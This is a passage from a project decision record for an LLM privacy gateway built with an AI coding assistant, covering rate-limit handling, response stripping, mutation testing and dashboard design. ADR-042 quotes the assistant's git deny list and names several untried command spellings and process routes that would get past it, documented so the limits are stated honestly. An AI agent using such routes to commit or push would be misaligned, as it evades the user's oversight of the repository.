rewritten guard, with the same meaning. RF12 to RF16 cover the empty
`stop`, RF17 `refusal: null`. Details are in the testing guide.

#### Decision 2 built (2026-10-10): the value proposed, then ruled 30 seconds

No live call was made. A provider 429 is now a **503** to the client, with
`Retry-After` set to the gateway's own fixed value. The provider's own
`Retry-After`, if any, is never passed on. No `x-should-retry` header is
sent (section 15 records why).

**The value: 30 seconds proposed (`PROVIDER_RETRY_AFTER_SECONDS` in
`src/gateway/errors.ts`). The user rules; a different value is a change to
that one constant and to the tests that pin it.**

**Ruled (the user, 2026-10-10): 30 seconds**, for the reason given below:
2N ≥ 60 is the condition for the last retry to outlive any per-minute
window, and 30 is the smallest value that meets it.

**Why a constant, not a `PSEUDONYM_*` setting like the other tunables
(the user, 2026-10-10).** Above 60, `openai-node` ignores the header and
falls back to its own 0.5 s / 1 s backoff, the behaviour this ruling
exists to replace. A setting would let someone defeat the mechanism with
one value, and nothing would say so: the gateway would still send a
`Retry-After`, and the client would simply not wait.

- **The 1 to 60 bound is pinned by a test**
  (`test/unit/gateway/errors.test.ts`, "is a whole number of seconds from
  1 to 60"), so changing the constant past the ceiling fails the suite
  (mutation RA4).
- **A setting would need runtime validation** at start-up in its place.
  Even with that, it would still allow a misconfiguration that fails
  quietly: a value inside the range but badly chosen (1, say) passes
  validation and brings back near-immediate retries into a provider that
  is already limiting.
- **Changing the value stays possible**, deliberately: a change to the
  constant in a reviewed commit, with the test and this record beside it.

- **The hard constraint:** a whole number from 1 to 60. Above 60,
  `openai-node` ignores the header and falls back to its own 0.5 s / 1 s
  backoff, the behaviour this ruling replaces. A unit test pins the bound
  whatever the value.
- **What N does with default SDK settings** (two retries, the header's
  delay used as given; section 13's reading of `retryRequest`): retries at
  about N and 2N seconds after the first failure, plus each call's own
  time.

  | N   | Retries at  | Definitive answer after | Last retry a full minute after the failure? |
  | --- | ----------- | ----------------------- | ------------------------------------------- |
  | 10  | 10 s, 20 s  | about 20 s              | no                                          |
  | 20  | 20 s, 40 s  | about 40 s              | no                                          |
  | 30  | 30 s, 60 s  | about 60 s              | **yes, the smallest N for which it is**     |
  | 60  | 60 s, 120 s | about 120 s             | yes, already at the first retry             |

- **The trade-off.** A larger N is more likely to clear a per-minute
  window; a smaller one gets the client a definitive answer sooner.
- **Why 30.** It is the smallest value whose last retry lands a full
  minute after the first failure. Whatever per-minute window caused the
  429, whether a calendar minute or a sliding 60 s, has turned over by
  that last attempt. That buys the most of the ruling's upside at half the
  wait of 60. It also keeps a margin below the ceiling (60 itself is
  allowed, `> 60 * 1000` is the SDK's test, but leaves none).
- **What 30 does not buy.**
  - If the burst that filled the window continues (other clients on the
    same key keep sending), the window may still be full at 60 s.
  - Against a daily limit, all three calls fail and the client waits
    about 60 s for the error instead of about 1.5 s today. That is the
    cost the ruling accepts. Telling the two kinds of limit apart would
    need the body (principle B).
  - For scale, `gemini-3.5-flash-lite`'s free tier allows 15 RPM and
    500 RPD (section 13 item 8); the daily count resets at midnight
    Pacific (section 14).

**The error code: `provider_rate_limited`**, in OpenAI's error shape:
`{"error": {"message": "the provider is limiting requests; try again
later", "type": "api_error", "param": null, "code":
"provider_rate_limited"}}`. How a client tells it apart:

- **by status:** 503, where every other provider failure is a 502
  (`provider_error`, `provider_bad_response`, `provider_empty_response`,
  `provider_unavailable`, `provider_response_too_large`) or a 504
  (`provider_timeout`). A client that reads only the status gets "try
  again later", and a `Retry-After`;
- **by `error.code`:** `provider_rate_limited` against
  `provider_empty_response` (an empty answer) and `provider_error` (any
  other provider status).

The code is deliberately not OpenAI's own `rate_limit_exceeded`. An SDK or
client branching on that code would conclude that its own key is
limited, which is tension 1. The message no longer carries the upstream
status number, today's one disclosure. The code already says the provider
is limiting, which is exactly what "status 429" said, and nothing more.

**Where a 429 can arrive, checked against the code.**

- `post()` in `src/providers/openai-compatible.ts` throws
  `ProviderError('http', status)` for any non-2xx status, before the
  content-type check and before any chunk is read.
- `stream()` resolves only after that, the content-type check and a first
  usable chunk.
- `server.ts` awaits `provider.stream()` before it sends a byte.

So **an HTTP 429 is always an ordinary HTTP error before any stream
begins**, and the streamed request gets the same 503, as JSON, with the
header (tested). One thing the ruling does not cover, by design: a
provider could report rate limiting _inside_ a started stream as an
error event. The adapter never reads error bodies (principle B), so such
an event is a `stream_error` (`provider_error`), the same as any other.
It is not an HTTP 429, and nothing recorded shows any provider doing it.

**The provider-400 path is untouched.** Only the `http` branch for status
429 is new. Every other provider status, 400 included, is still a 502
`provider_error` with the status in the message and no header. That is
tested for 400, 401, 403, 404, 408, 409, 422, 500, 502 and 503. Section
13's 4b, when built, must stay "any provider 400", never "any 4xx". Mutation
RA6 (a 429 branch that takes every 4xx) is caught by the 400 cases, so
that boundary is now guarded from this side too.

**A second existing test changed, which section 15 did not predict.**
Section 15 said the strict fake's pinned 429 test would be the only one.
`test/integration/chat-completions.test.ts`, "provider failures", also
had a table row `[429, 502, 'provider_error']`, asserting the old message
"the provider returned an error (status 429)". That row was removed from
the table and replaced by a test of its own, asserting the 503, the
header and the full error body. The table's other four rows (400, 404,
500, 503) are unchanged. The strict fake's pinned test was replaced as
predicted. No other test changed.

**Proof.** The new tests were run against the code before the change: 5
failed, each with `expected 502 to be 503`, and 130 passed, including
"every other provider status keeps its 502". After the change the three
test files passed 167 of 167. Mutations RA1 to RA8
(`scripts/mutations/rate-limit.ts`): **8 of 8 caught**. Details are in the
testing guide.

#### Decision 3 built (2026-10-10): the strip made deliberate, and counted

No live call was made.

**What `extra_content` carries in the recordings.** In all 12 recorded
Gemini answers it is exactly `{google: {thought_signature: <string>}}`,
with no other key at either level:

- the 10 non-streamed answers carry it on `message`;
- the 2 streamed answers carry it on the finish chunk's `delta`;
- the signatures are 132 characters long in 10 answers, 952 in p12 and
  1,004 in p13.

`extra_content` is Google's namespace and could carry more than we have
seen, so **the strip is described by what it drops**: everything a
provider sends beyond the gateway's own shape, `extra_content` whole,
whatever it holds. It is not "the thought signature".

**How the strip is made deliberate (item 1).**

- **Zod was never the only barrier.** The adapter's result
  (`complete()`), every stream event (`chunkEvents`), the gateway's
  response (`server.ts`) and every streamed chunk (`stream.ts`) are each
  built field by field from named values. A `.passthrough()` or looser
  schema alone changes none of them.
- **A leak needs something spread through.** The tests are aimed at
  exactly that:
  - the adapter's non-streamed result must have exactly the keys `content`,
    `created`, `dropped`, `finishReason`, `id` and `usage` for every
    recording;
  - every stream event may hold only `type`, `text` and `reason`;
  - the client's message must have exactly `content`, `refusal` and
    `role`, and every streamed `delta` only `role`, `content` and
    `refusal`;
  - no 16-character stretch of any signature may appear in the result,
    the response or any log line.
- **Shown to fail:** mutations SG1 (the result spreads the parsed
  message) and SG2 (a content event spreads the parsed delta), the two
  refactors that would carry `extra_content` through, are caught by 15
  and 18 tests aimed at them in the final run.
- **Read on purpose, in code.** `extra_content` is now declared in both
  schemas, as `z.unknown().optional()` with the comment "Read only to be
  counted (tally), never kept". The adapter's header comment says the drop
  is the field-by-field construction and points at the replay test.

**The replay (item 2).** `test/integration/gemini-recordings.test.ts`
serves each of the 12 recorded answers, byte for byte with its recorded
content type, through the real adapter and through the real gateway: the
10 non-streamed answers on the non-streamed path, s2 and s3 on the
streamed path. s3 fails as recorded (usage on every chunk,
`provider_bad_response`) before its `extra_content` chunk is read, so it
is checked for no leak and no count. The signatures are read from the
recordings only to test their absence, and only through boolean checks.
Every count is compared in a form that prints numbers or a type name,
never a string, so a fault that put the signature where its length goes
(SG8) fails without printing it. That holds by construction; the
mutation runner records only test names, and its output was checked to
hold no signature text.

**The count (item 3): a log line per answer, and nothing else.** There is
no metrics surface. For each answer that carried `extra_content`, the
gateway writes one `info` line, `"provider extra content dropped"`, with
two fields:

- `extraContent`: how many `extra_content` objects there were (message,
  or every streamed delta);
- `thoughtSignatureLengths`: the length in characters of each
  `extra_content.google.thought_signature` string.

Details:

- An `extra_content` without a thought signature adds to the count and
  to no length, so the difference shows that something else was there,
  without naming it.
- For a stream, the line is written when the stream ends, however it
  ends.
- An answer that fails is not counted: `empty_response` before the count
  when not streamed, and anything before the chunk that carries it when
  streamed (s3).
- The adapter reads the signature only to take its length; nothing keeps
  the string.
- The tests check, for every recording, exactly one such line with the
  right count and length, and that no part of any signature, and no part
  of the request (the email address and the word "refund" it was sent
  with), appears in any log line.
- The README's sentence on what logs contain and the user manual's Logs
  section now say this.

Section 15's rulings said a new field in the log's fixed set is put to
the user first. This is a separate line, not a field added to the
request lines, and it was asked for in this form ("say exactly what is
written and where").

**Log volume, and why `info` (recorded 2026-10-10).** Every recorded
Gemini answer carries `extra_content`, so every Gemini request writes the
new line. Measured on this code with a stub provider: a request without
`extra_content` writes **2** lines (Fastify's "incoming request" and
"request completed"); with it, **3** ("provider extra content dropped"
between them). That is **50% more log lines for Gemini traffic**, not a
doubling as first stated when this note was asked for: the request
already writes two lines, not one. `info` was chosen so that the count is
on at the default level (`LOG_LEVEL=info`), where it serves its purpose:
making the dropped signatures visible, and the lengths available as
evidence. **If the volume ever matters, `debug` is the fallback**: the
line then disappears at the default level and comes back with
`LOG_LEVEL=debug`, at the cost of the count not being there unless asked
for.

**A side benefit of the lengths, not the reason for the ruling.** Section
13 (item 4) recorded, as a hypothesis on n = 2, that the signature's
length tracks hidden thinking tokens: 952 and 1,004 characters on the two
calls with hidden thinking (p12, p13), against 132 on the seven without.
Accumulating lengths in the log is the cheapest way to add evidence for
or against it. The ruling stands on the strip and on making its cost
visible, not on this.

**The quality cost, as recorded in the ruling.** Later turns may degrade,
since Google recommends sending the signature back for thinking models.
The counts make that cost visible rather than assumed: every answer that
carried a signature the gateway dropped writes a line.

**A slip while building it (bug-log 71).** Declaring
`extra_content: z.unknown()` without `.optional()` made it a required
key in this Zod version. Every answer without it was then rejected as
`bad_response`: 102 tests failed at once, before anything was committed.
It was fixed with `.optional()`, and SG10 now puts it back and is caught
by 50 tests.

**Proof.** The replay test was run against the code before the change:
23 of 25 failed, each on the missing count (no `dropped` in the result, no
log line, no `stream.dropped`). No leak assertion failed: today's strip
already held on all 12 recordings. After the change the replay, adapter
and strict-fake files passed 192 of 192.

The gate's coverage run then found two branches of the tally that no
recording reaches. Seven adapter tests were added for `extra_content`
shapes no recording has (a string, an array, no `google` key, a `google`
that is not an object, a non-string signature, null, a signature beside
other keys), together with SG11 and SG12. The `isRecord` guards on
`extra_content` and `google` are not mutated: removing either changes no
result, because reading a property off a string or number already gives
`undefined`.

Mutations SG1 to SG12 (`scripts/mutations/extra-content.ts`): **12 of 12
caught** against the final tests. In that run SG1 took 653 s (12 s before),
with one unrelated timing test failing beside its 15 aimed tests. The
testing guide reads this as the machine being held up; it was not
reproduced.

<a id="adr-042"></a>

## ADR-042: Rule 1 is kept by compliance; the permission deny list is a partial backstop (2026-10-08)

**Status.** Accepted (the user, 2026-10-08). The assistant's permission
settings are not changed; this ADR records what they do and do not do, so
that no document claims more.

**Why an ADR and not the bug log.** The bug log records bugs: a symptom, a
root cause, a fix and the test that now guards it. Nothing here is a bug in
the code, there is no fix, and no test can guard it. It is a standing
decision about how a project rule is enforced and what may be said about
that, which is what this record is for.

**Context.** Rule 1 of the project brief: the assistant never commits,
pushes, tags, merges, rebases or resets, and never runs `gh`; reading git
state is allowed. The assistant's permission settings
(`.claude/settings.json`, gitignored, so the entries are quoted here) deny
these shell commands:

```
"Bash(git commit:*)", "Bash(git push:*)", "Bash(git tag:*)",
"Bash(git merge:*)", "Bash(git rebase:*)", "Bash(git reset:*)",
"Bash(git -C:*)", "Bash(gh:*)"
```

Each entry matches by how the command text begins.

**What happened, and a correction.** On 2026-10-08 the assistant reported
that `git log --oneline -6` and `git status --short` had been denied. That
wording shortened the commands. The commands actually run were
`git -C "<repository root>" log --oneline -6` and
`git -C "<repository root>" status --short` (the argument was the
repository's absolute path), and both were refused by the deny entry
`Bash(git -C:*)`. They were not approval prompts left unanswered. The same
reads typed without `-C`, after changing into the repository, ran later
the same day.

**Why `git -C` is denied, and the problem it causes.** The reason was not
recorded when the entry was added; the likely one: `git -C <dir> commit`
does not begin with `git commit`, so without this entry every other git
entry could be passed by adding `-C <dir>`. The entry closes that gap for
every `git -C` command, reads included. It cannot be narrowed to the
writes: a deny entry wins over an allow entry, so read-only `git -C`
forms cannot be allowed back while the rest stay denied. The cost is that
git reads must be typed without `-C`.

**The list is partial.** Each of these begins with `git` and a global
option, so it matches none of the entries. They were found by reading git's
option syntax and **were not tried**: trying one would be the action
rule 1 forbids.

1. `git -c <key>=<value> commit` (lower-case `-c`: set a configuration
   value for one command);
2. `git --git-dir=<dir> commit`;
3. `git --work-tree=<dir> commit`;
4. `git --no-pager commit`.

The same holds for `push` and the rest. Beyond git's own options, the
list governs only the command text the assistant types into its shell
tool. A program the assistant writes or runs can start git itself (this
project's own `scripts/live-run-guard.ts` runs git through
`execFileSync`), and so can a shell started inside a command, an npm
script or a git alias. Whether a compound command such as
`cd <dir> && git commit` is checked part by part was not verified. **The
list cannot be made complete.** Git's global
options and the ways of starting a process are open-ended; adding the four
entries above would narrow the gaps without closing them.

**Decision.**

- **Rule 1 is enforced by the assistant complying with it. The deny list
  is a backstop that catches the common spellings, not the other way
  round.** No document may say that the permission settings prevent the
  assistant from committing or pushing.
- `.claude/settings.json` is not changed (the user's decision). Adding the
  four entries above is possible and was not done.
- The assistant types git reads without `-C`:
  `cd <repository> && git status --short`.
- A check that must run is not written as a command for someone to type.
  It goes into code that runs under the user's own shell, as the live-run
  guard does (ADR-041 section 11, where the `git -C` refusal is reason (d)
  for replacing the typed `git log -1` check).

**Consequences.** Rule 1 rests on compliance. A lapse would not be stopped
by the settings in every spelling; the user, who makes every commit by
hand, would see an unexpected commit or push in the history and on GitHub.

<a id="adr-043"></a>

## ADR-043: Mutation lists were never tracked; every earlier mutation count is attested, not reproducible (2026-10-10)

**Status.** Accepted (the user, 2026-10-10). Lists are tracked from this
date. Nothing earlier is reconstructed.

**Context.** Mutation checks are this project's main evidence that its
tests can fail: nearly every phase, part and bug fix in this record, the
bug log and the testing guide reports "N of N mutations caught". The
runner, `scripts/mutate.ts`, has been in the repository since 2026-10-01
(bug-log 24). The lists it runs, which say what was changed, where, and
which tests were run, were kept in each session's scratchpad. Its own
header said so ("Lists and results live outside the repo"), as did the
bug log and the testing guide. No reason for keeping them out was ever
recorded.

On 2026-10-10 the list for the live-run guard (ADR-041 section 11, run on
2026-10-08) was needed again and was gone with its scratchpad. A list
rebuilt from the ADR's description caught 11 of 11, but it is not the
same list: comparing it with the 2026-10-08 session's record, the user
found that two of its mutations, under the same labels, change different
things, and that the script-level test catches a different subset.

**What the history holds, read from the repository on 2026-10-10.**

- Every path ever committed, on every ref, filtered for "mutat": only
  `scripts/mutate.ts`, `scripts/mutation-marker.ts`,
  `scripts/mutation-reporter.ts`, `test/support/mutation-guard.ts`,
  `test/unit/scripts/mutation-marker.test.ts`. That is the runner, its
  reporter and its marker, not a list.
- No commit on any ref adds or removes the text `export const MUTATIONS`
  (`git log --all -S`), the form every list takes.
- No commit's diff contains a `find:` entry followed by a quoted string
  (`git log --all -G`), the form of a mutation in any list.
- No `.mjs` file, the format the lists were written in, was ever
  committed.

**Finding.** **No mutation list has ever been tracked in this project.**
Every mutation count recorded before 2026-10-10, in this record, the bug
log, the testing guide and the project's status notes, was recorded when
its run was made, and the definitions that produced it are not in any
commit. Those runs happened and their counts were written down at the
time; but a reader cannot re-run any of them, cannot check a count against
what was mutated, and cannot tell whether two runs under the same label
mutated the same thing. **They are attested, not reproducible from the
history.** The same applies to statements built on them: a mutant called
"equivalent", or a test said to be the only one that catches a mutation.

**Decision.**

- From 2026-10-10 every mutation list is tracked in `scripts/mutations/`,
  one TypeScript module per list, typed by the runner's exported
  `Mutation`, and committed with the change it checks. Results stay
  outside the repository (they are outputs; the counts go into the
  documents).
- `test/unit/scripts/mutation-lists.test.ts` keeps every tracked list
  runnable (each `find` exactly once in its file, unique ids, existing test
  files), so a tracked list cannot quietly rot into one that no longer
  runs.
- **No earlier list is reconstructed.** A rebuilt list would be a new list
  carrying an old count; it could only be presented as what it is, a new
  run. The one rebuilt list, the live-run guard's, is tracked under new ids
  (T1–T9, S1, S2) and labelled as a reconstruction, not as the 2026-10-08
  list.

**Consequences.** The project's mutation evidence before 2026-10-10 rests
on its written record, as rule 1 rests on compliance (ADR-042). Any
document that cites an earlier mutation count is citing an attested
result. A list is now part of the change it checks, so changing a guarded
line means updating its list in the same commit.

<a id="adr-044"></a>

## ADR-044: Rule 1 governs this repository's history and remote; a test may commit inside a throwaway repository (2026-10-10)

**Status.** Accepted (the user, 2026-10-10). The user amended rule 1 of the
project brief; the assistant did not amend it on its own. The brief is
gitignored, so this ADR is the public record of the amendment and its
reasoning. It is committed before any test that relies on it is written.

**Context.** Rule 1, as written: the assistant never commits or pushes on
the user's behalf, with no exceptions, and this covers `git commit`,
`git push`, `git tag`, `git merge`, `git rebase`, `git reset`, `gh`, "and
any other command, script or tool that creates commits or changes remote
state". The live-run guard's push requirement (ADR-041 section 11,
amendment of 2026-10-10) is tested only against a fake git: a throwaway
repository can reach the ancestry check only with a commit in it, and the
literal wording of rule 1 covers a test that makes one. That amendment
recorded the gap and left it open.

**What rule 1 protects.** Every commit in this repository's history, and
everything on its remote, was made by the user. The history is the user's
own record: who committed what, and when. That matters beyond authorship
here, because this project uses its history as evidence (an ADR that
governs a measurement is committed before the measurement, rule 6, and the
commit that does so is the user's act). Rule 1 keeps the assistant from
writing into that record, by any route.

**Why a throwaway repository falls outside it.** A repository that a test
creates in a temporary directory and deletes when it ends shares nothing
with this one: its commits are never in this repository's object store or
refs, never reach this repository's remote or any other, and are gone when
the test ends. Nothing the user reads as the project's record (the local
history, GitHub) can contain them, and no one could take them for the
user's commits. What rule 1 guarantees, that every commit in this history
and on its remote was made by the user, is exactly as true with such tests
as without them. The literal wording ("any … script … that creates
commits") catches them; the purpose does not.

**Decision.** Rule 1 is amended (the brief's text, in substance):

- It governs the Pseudonym repository's own history (its working tree,
  `.git` and refs) and its remote.
- A test may create commits inside a throwaway repository that the test
  itself makes in a temporary directory and deletes when it ends, provided
  that repository never reaches this one or any remote: nothing fetched
  from it into this repository, nothing pushed from it, no configured
  remote pointing anywhere real (a remote-tracking ref may be set directly,
  without a remote), and a synthetic author identity given to that
  repository's commands only, never written to the global git config or to
  this repository's config (so no real name or address is recorded, rules
  4 and 5).
- **Everything else is unchanged.** The assistant never commits, pushes,
  tags, merges, rebases or resets in this repository, and never runs those
  commands for the user. A test that made a commit in this repository
  would still break rule 1.

ADR-042 is unchanged too: rule 1 is still kept by compliance, the
permission deny list is still a partial backstop, and a program can still
start git where the deny list does not look. This amendment changes what
is allowed in a throwaway repository, not how the rule is enforced in this
one.

**Why it was made, and why that does not decide it.** The amendment was
made to allow a real-git test of the guard's push check, so that the
ancestry check meets real `git merge-base --is-ancestor`. **The reasoning
above does not depend on what that test finds.** If the test shows the
check works, the argument stands; if it shows the check is wrong, or finds
a bug elsewhere, the argument stands just the same, and the amendment is
not revisited because of the result. Changing a rule that is in the way is
legitimate only when the argument for the change would hold whatever the
result it unblocks turns out to be; this one is about what the rule
protects, not about the test. It is committed before the test is written,
so the history shows the order.

**Consequences.** Tests may build throwaway repositories with real
commits, and the guard's push check can be tested against real git. The
cost is a new duty on every such test: create the repository under the
system's temporary directory, give its commits a synthetic identity, set
no real remote, and delete it at the end without following a link out of
its directory (the guard test's cleanup already removes its `src` junction
first, for that reason). A test that breaks any of these is outside the
amendment and breaks rule 1.

<a id="adr-045"></a>

## ADR-045: Where the dashboard's counts come from (2026-10-10; accepted: option 5)

**Status.** Accepted (the user, 2026-10-10): **option 5**, the committed
evaluation results, not live traffic. The ruling and its reasoning are at
the end. Nothing is built or stubbed (rule 12). Proposed the same day. It
was written ahead of time because some options change the Phase 8 Docker
work (a second port, more services in the compose file). It does not
change ADR-041 section 3: if the dashboard is built, it comes **after
Phase 8**, shows **counts only, never message content**, and is **off by
default**.

**Context.** The gateway has no source of counts. The two log lines added
on 2026-10-10 are records of single events: the `provider_empty_response`
error line and the "provider extra content dropped" line (ADR-041 section
15). A log is not a running total. Creating one is a design decision, not
plumbing. Counters are state that outlives a request, in a gateway whose
design says "no state carries between requests, only between messages of
the same request" (ADR-013, `redact.ts`). An in-process counter holds no
value, but it is still cross-request state, so any option that adds one
amends ADR-013 in letter, if not in spirit.

### What is counted (settled before the options)

ADR-041 section 3 recorded the page as "a request before and after
redaction", then limited it to counts only. Showing a request before
redaction is content, so it is ruled out. In counts, "before and after"
means **what the gateway found in what clients sent, against what reached
the provider and what came back**. Concretely:

| Group                      | Quantity                                               | Dimension (the only one)                                                                                               |
| -------------------------- | ------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------- |
| Requests                   | requests handled, by outcome                           | 200, or each error `code` in `src/gateway/errors.ts` (a closed list)                                                   |
| Before → after (redaction) | distinct values replaced; requests with at least one   | each placeholder namespace: `DETECTION_TYPES` plus `LITERAL`                                                           |
| After (restoration)        | placeholders restored; held back, by rule              | `restored` and each `HELD_BACK_RULES` entry (`RestoreCounts` already computes these per request)                       |
| Provider behaviour         | empty answers, named refusals, `extra_content` dropped | none, except signature length in **fixed buckets** (for example ≤ 256, ≤ 1,024, > 1,024 characters), never raw lengths |
| Names (when on)            | requests refused, by reason                            | each `NameFailure`                                                                                                     |

- **Granularity:** totals per row of that table, and nothing finer. No
  dimension by client, user, key, request, message, value, placeholder
  index or time of an individual event.
- **Window:** for the live options (1 to 4, 6), counters that only go up,
  from process start (1, 3), from the store's creation (4) or over
  whatever the log pipeline kept (2). Rates over a window are the reader's
  job, not the gateway's. For option 5, one evaluation run: a dataset at a
  commit, with the history `eval/baseline.json` already keeps.
- **What no live count can show.** The gateway counts only what its
  detectors caught. A value they miss is sent as written and counted
  nowhere. Live counts can show "N Aadhaar numbers replaced" but never "M
  sent as written". Only the evaluation measures misses (ADR-040), on
  labelled data. This shapes the recommendation below.

### The two traps, whichever option wins

**1. Granularity is a privacy boundary.** Counts per data type are fine.
Counts per value would be a leak and would grow without bound: each new
value is a new series, so a counter keyed by value is also a memory leak
that a client could drive. **The line:** every dimension value comes from a
closed list fixed at compile time (the table above). Nothing is derived
from request or response text: no value, no value key, no placeholder
index, no length of a value (a 12 says Aadhaar), and no signature length
except in fixed buckets.

**A residual leak that per-type totals cannot remove: watching the
counter.** Anyone who can read a live counter often enough can tie "AADHAAR
went up by 1 at 10:42:05" to a request they know was sent then, and learn
what kind of data it held. Options 1, 3 and 4 have it, and so does option
2 if the per-request line is kept. Options 1 and 3 can only limit who can
read the endpoint (its own port, bound to localhost or a private network).
Options 5 and 6 do not have it: 6 because only the request's own client
sees its counts.

**How a test proves the line is not crossed**, for any live option:

- (a) **types**: every label is a TypeScript union of the literal lists,
  so a label of type `string` does not compile;
- (b) **cardinality**: after the no-leak test's corpus (hundreds of
  messages full of planted values) is sent through the gateway, the set of
  series equals a fixed expected set, the same after 1 request as after
  all of them;
- (c) **no value in any form**: the endpoint's output, the log or the
  store is run through the existing leak check, raw, without separators
  and lowercased, for every planted value;
- (d) **a mutation** that adds a value-derived label is caught by (b).

**2. Per-replica counts under-report.** Behind a load balancer, an
in-process counter shows one instance's share since that instance last
started. A dashboard that presents it as "the gateway's" numbers is quietly
wrong, the failure this project exists not to ship. So **every option must
say what its numbers mean**, and the dashboard must print that meaning
beside them ("replica `<id>`, since `<start time>`"), not leave it to a
footnote.

### The options

**1. In memory, per process, on an endpoint, off by default.**

- _Numbers mean:_ this process, since it started. Lost on restart; one
  replica's share behind a load balancer.
- _Costs:_ a small counter module, an endpoint, an ADR-013 amendment, and
  the counter-watching leak, bounded only by who can reach the endpoint.
  The gateway has no authentication, so on the main port every client
  could read the counts of every other client's requests. It belongs on
  its own port.
- _Container and compose:_ a second port, `EXPOSE`d but not published by
  default; compose maps it only when the flag is on. Health check and
  ADR-016 hardening unchanged.
- _Flag:_ yes (`PSEUDONYM_COUNTS`, like `PSEUDONYM_NAMES`), with the port.
- _New measurements:_ none to build it.
- _Content proved absent by:_ trap 1's tests (a) to (d).

**2. Structured log lines only, added up outside the gateway.**

- _Numbers mean:_ whatever the log pipeline kept. Complete across replicas
  if every replica's `info` logs are shipped and nothing is dropped,
  rotated away, sampled or filtered by a raised level. It under-reports
  silently otherwise, and nothing in the gateway can tell.
- _Costs:_ **no new state in the gateway**, which is its strength. Today's
  logs do not hold redaction counts per type, so one new per-request line
  would be needed: types found, restoration counts. That is a field-set
  change, put to the user first (ADR-041 section 15). It also makes the
  log hold, per request id and time, which kinds of data that request
  carried: finer than any total, and durable. The adding-up (a script,
  Loki, Vector) lives outside the image. Another line per request: the
  `extra_content` line already took Gemini requests from 2 to 3 lines.
- _Container and compose:_ image unchanged; compose gains a logging
  driver or a collector only if the dashboard is in it.
- _Flag:_ yes for the new line (or `debug` level), to stay off by default.
- _New measurements:_ log volume, on real request shapes.
- _Content proved absent by:_ the canary test's no-value check, extended
  to the new line, plus a closed field set (the line's keys and value
  types fixed and tested).

**3. A Prometheus-style exporter (`/metrics`, text exposition format).**

- _Numbers mean:_ per process since start, as in 1. **But the scrape
  contract makes the totals honest if used as designed:** Prometheus
  scrapes every replica as a separate target and sums them, and `rate()` /
  `increase()` handle restarts. A dashboard built on one target's raw
  numbers has trap 2 again.
- _Costs:_ as 1, plus a format: `prom-client` (a dependency, ADR-level per
  rule 6), or the exposition format hand-written for a fixed set of
  counters (small; rule 7 prefers it). A dashboard needs a Prometheus
  server and Grafana or similar: two more services. OpenTelemetry metrics
  (OTLP push) are a variant with the same meaning, more dependencies and a
  collector service.
- _Container and compose:_ a second port as in 1; compose gains
  `prometheus` (scrape config) and `grafana` (dashboard JSON), each with
  its own image, volume and configuration files to review.
- _Flag:_ yes, with the port.
- _New measurements:_ none to build it.
- _Content proved absent by:_ trap 1's tests (a) to (d), run against the
  scrape output.

**4. An external store (Redis, SQLite).**

- _Numbers mean:_ with Redis shared by every replica, a true total across
  replicas since the store was created. That is the only option whose
  numbers cover the whole deployment by themselves. With SQLite, a file
  per container unless shared, and SQLite across hosts is not a
  multi-writer store.
- _Costs:_ the dependency Phase 0 deliberately avoided (rule 6, 7); a
  network call on the request path, or a buffer that can lose counts on
  crash; a new failure mode. It must never block or fail a request, so
  counts are dropped when the store is down, and under-reporting comes
  back unless a "writes failed" counter is itself shown. A store is
  persistent state that outlives the process: the furthest from ADR-013.
  It also needs authentication and its own hardening.
- _Container and compose:_ image gains a client library; compose gains a
  `redis` service, a network, a volume, credentials (secrets, not
  environment variables), and a health dependency.
- _Flag:_ yes, plus the store's address and credentials.
- _New measurements:_ the cost per request of the write, and behaviour
  with the store down.
- _Content proved absent by:_ trap 1's tests (a) to (d), run against a
  dump of the store; plus a check that the client never sends a key built
  from request data.

**5. No live counts: the dashboard renders the committed evaluation
results.**

- _Numbers mean:_ exactly what the README's results mean today:
  - per data type, on the two labelled datasets at a commit: redacted out
    of planted, precision, and **values sent as written** (ADR-040);
  - the echo measurement (ADR-033);
  - the model rewrite rates (ADR-017);
  - the person-name results (ADR-035, ADR-036);
  - "before and after" as the evaluation already defines it: the history
    of accepted baselines in `eval/baseline.json`, and detected against
    sent.
- _What it cannot show that the others can:_
  - anything about real traffic: volume, which types real clients send,
    the real mix, drift over time;
  - how often the provider sends empty answers, refusals, 429s or
    `extra_content` in practice;
  - name detection refusing in production;
  - anything about a particular deployment.

  It is a page about the gateway's measured behaviour, not about its use.

- _What it shows that none of the live options can:_ **misses.** Values
  sent as written, the number the project's promise is actually about,
  and the one an interviewer asks. Live counts are blind to misses by
  construction.
- _Costs:_ a generator that reads `eval/baseline.json`,
  `eval/model-rewrites.json` and the names baselines and writes a static
  page; plus a check that the page matches the files, as the README block
  is checked today. No state, no endpoint, no flag, and no new privacy
  surface: the inputs hold per-type counts only (ADR-021 checked that no
  label is stored).
- _Container and compose:_ **none.** The page is not served by the
  gateway; it lives in the repository or on a static host. "Off by
  default" holds trivially.
- _New measurements:_ none.
- _Content proved absent by:_ the inputs are counts by construction and
  already checked; the generated page goes through the repository hygiene
  scan like the README; a test pins that the generator reads only those
  files.

**6. (added) Each response carries its own request's counts, and the
client adds them up.**

- _Numbers mean:_ that one request; any total is the client's own, over
  its own traffic only.
- _Costs:_ no gateway state. A non-OpenAI response header (for example
  `x-pseudonym-replaced: AADHAAR=1,EMAIL=2`): clients ignore unknown
  headers, so this does not break compatibility. The counts are visible to
  anything that sees the response: proxies, browser developer tools,
  client logs. They describe the client's own message, but per request,
  which is the finest granularity in this list.
- _Container and compose:_ none.
- _Flag:_ yes, off by default.
- _New measurements:_ none.
- _Content proved absent by:_ the header's grammar is closed (type names
  from the list, integers), tested with the no-leak corpus as in trap 1.

### Which options change the Phase 8 Docker work

- **Options 1 and 3:** the Dockerfile `EXPOSE`s a second port, and
  `HOST=0.0.0.0` inside the container (ADR-016's Phase 8 note) needs
  deciding for that port separately. Compose maps it only behind the
  flag. Option 3 with its dashboard adds two services and their
  configuration.
- **Option 4:** adds a service, a network, a volume, secrets and a
  startup dependency; the image gains a client library.
- **Option 2:** the image is unchanged; compose may gain logging
  configuration or a collector.
- **Options 5 and 6:** no change at all. The Phase 8 Dockerfile and
  compose file are one service, as planned.

Deciding now therefore settles whether Phase 8 builds a one-service
compose file with one port, or plans for more.

### Recommendation (the assistant's; not a decision)

**Option 5.** It adds no state and no privacy surface, changes nothing in
Phase 8, and shows the number the project's promise is about (misses).
That is the number no live option can show. Its limit is real and should
be printed on the page: it describes the gateway's measured behaviour on
labelled data, not any deployment's traffic. **If live counts are ever
wanted, option 3**, behind a flag, on its own port bound to a private
interface, with trap 1's four tests, and with "per replica, since start"
printed beside every number. Its scrape contract is the one standard way
